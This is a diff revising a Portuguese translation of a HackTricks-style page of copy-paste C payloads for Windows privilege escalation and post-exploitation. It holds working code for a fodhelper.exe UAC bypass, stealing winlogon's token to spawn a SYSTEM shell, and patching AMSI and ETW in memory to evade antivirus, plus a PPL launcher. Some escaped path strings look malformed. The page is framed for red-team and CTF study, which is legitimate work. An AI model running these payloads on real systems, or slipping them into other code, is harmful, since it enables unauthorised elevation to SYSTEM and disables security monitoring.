@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Esta página coleta **pequenos trechos de C autônomos** que são úteis durante a Escalação de Privilégios Locais no Windows ou pós-exploração. Cada payload é projetado para ser **amigável ao copiar e colar**, requer apenas a API do Windows / tempo de execução C, e pode ser compilado com `i686-w64-mingw32-gcc` (x86) ou `x86_64-w64-mingw32-gcc` (x64).
+Esta página reúne **pequenos trechos de C autocontidos** que são úteis durante Windows Local Privilege Escalation ou post-exploitation. Cada payload é projetado para ser **fácil de copiar e colar**, requer apenas a Windows API / C runtime, e pode ser compilado com `i686-w64-mingw32-gcc` (x86) ou `x86_64-w64-mingw32-gcc` (x64).
 
-> ⚠️  Esses payloads assumem que o processo já possui os privilégios mínimos necessários para realizar a ação (por exemplo, `SeDebugPrivilege`, `SeImpersonatePrivilege` ou contexto de integridade média para um bypass de UAC). Eles são destinados a **configurações de red-team ou CTF** onde explorar uma vulnerabilidade resultou na execução de código nativo arbitrário.
+> ⚠️  Estes payloads assumem que o processo já possui os privilégios mínimos necessários para executar a ação (por exemplo, `SeDebugPrivilege`, `SeImpersonatePrivilege`, ou contexto de integridade média para um UAC bypass). Eles são destinados a **red-team or CTF settings** onde explorar uma vulnerabilidade resultou em arbitrary native code execution.
 
 ---
 
@@ -20,8 +20,8 @@ return 0;
 ```
 ---
 
-## UAC Bypass – `fodhelper.exe` Registro Hijack (Integridade Média → Alta)
-Quando o binário confiável **`fodhelper.exe`** é executado, ele consulta o caminho do registro abaixo **sem filtrar o verbo `DelegateExecute`**. Plantando nosso comando sob essa chave, um atacante pode contornar o UAC *sem* gravar um arquivo no disco.
+## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
+Quando o binário confiável **`fodhelper.exe`** é executado, ele consulta o caminho do registro abaixo **sem filtrar o verbo `DelegateExecute`**. Ao plantar nosso comando nessa chave, um atacante pode bypass UAC *sem* gravar um arquivo no disco.
 
 *Caminho do registro consultado por `fodhelper.exe`*
 ```
@@ -61,12 +61,12 @@ system("fodhelper.exe");
 return 0;
 }
 ```
-*Testado no Windows 10 22H2 e Windows 11 23H2 (patches de julho de 2025). O bypass ainda funciona porque a Microsoft não corrigiu a verificação de integridade ausente no caminho `DelegateExecute`.*
+*Testado no Windows 10 22H2 e Windows 11 23H2 (patches de julho de 2025). O bypass ainda funciona porque a Microsoft não corrigiu a falta de verificação de integridade no caminho `DelegateExecute`.*
 
 ---
 
-## Criar shell SYSTEM via duplicação de token (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
-Se o processo atual possui **ambos** os privilégios `SeDebug` e `SeImpersonate` (típico para muitas contas de serviço), você pode roubar o token de `winlogon.exe`, duplicá-lo e iniciar um processo elevado:
+## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
+Se o processo atual possuir **ambos** os privilégios `SeDebug` e `SeImpersonate` (típico de muitas contas de serviço), você pode roubar o token do `winlogon.exe`, duplicá-lo e iniciar um processo elevado:
 ```c
 // x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
 #include <windows.h>
@@ -102,7 +102,7 @@ DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPri
 STARTUPINFOW si = { .cb = sizeof(si) };
 PROCESS_INFORMATION pi = { 0 };
 if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
-L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
+L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
 NULL, NULL, &si, &pi)) {
 CloseHandle(pi.hProcess);
 CloseHandle(pi.hThread);
@@ -114,7 +114,7 @@ if (dupToken) CloseHandle(dupToken);
 return 0;
 }
 ```
-Para uma explicação mais profunda de como isso funciona, veja:
+Para uma explicação mais aprofundada de como isso funciona veja:
 
 {{#ref}}
 sedebug-+-seimpersonate-copy-token.md
@@ -122,8 +122,8 @@ sedebug-+-seimpersonate-copy-token.md
 
 ---
 
-## Patch AMSI & ETW em Memória (Evasão de Defesa)
-A maioria dos motores AV/EDR modernos depende de **AMSI** e **ETW** para inspecionar comportamentos maliciosos. Fazer patch em ambas as interfaces cedo dentro do processo atual impede que payloads baseados em script (por exemplo, PowerShell, JScript) sejam escaneados.
+## In-Memory AMSI & ETW Patch (Defence Evasion)
+A maioria dos motores AV/EDR modernos depende de **AMSI** e **ETW** para inspecionar comportamentos maliciosos. Aplicar patches em ambas as interfaces cedo dentro do processo atual impede que script-based payloads (por exemplo PowerShell, JScript) sejam escaneados.
 ```c
 // gcc -o patch_amsi.exe patch_amsi.c -lntdll
 #define _CRT_SECURE_NO_WARNINGS
@@ -150,12 +150,56 @@ MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
 return 0;
 }
 ```
-*O patch acima é local ao processo; iniciar um novo PowerShell após executá-lo será feito sem inspeção AMSI/ETW.*
+*O patch acima é local ao processo; iniciar um novo PowerShell após executá-lo fará com que ele seja executado sem inspeção AMSI/ETW.*
+
+---
+
+## Criar processo filho como Protected Process Light (PPL)
+Solicite um nível de proteção PPL para um processo filho no momento da criação usando `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Esta é uma API documentada e só terá êxito se a imagem alvo estiver assinada para a classe de assinante solicitada (Windows/WindowsLight/Antimalware/LSA/WinTcb).
+```c
+// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
+#include <windows.h>
+
+int wmain(void) {
+STARTUPINFOEXW si = {0};
+PROCESS_INFORMATION pi = {0};
+si.StartupInfo.cb = sizeof(si);
+
+SIZE_T attrSize = 0;
+InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
+InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);
+
+DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
+UpdateProcThreadAttribute(si.lpAttributeList, 0,
+PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
+&lvl, sizeof(lvl), NULL, NULL);
+
+if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
+EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
+// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
+return 1;
+}
+DeleteProcThreadAttributeList(si.lpAttributeList);
+HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
+CloseHandle(pi.hThread);
+CloseHandle(pi.hProcess);
+return 0;
+}
+```
+Níveis usados com mais frequência:
+- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
+- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
+- `PROTECTION_LEVEL_LSA_LIGHT` (4)
+
+Valide o resultado com Process Explorer/Process Hacker verificando a coluna Protection.
 
 ---
 
 ## Referências
 * Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
 * SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
+* CreateProcessAsPPL – lançador de processo PPL mínimo: https://github.com/2x7EQ13/CreateProcessAsPPL
+* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
 
 {{#include ../../banners/hacktricks-training.md}}
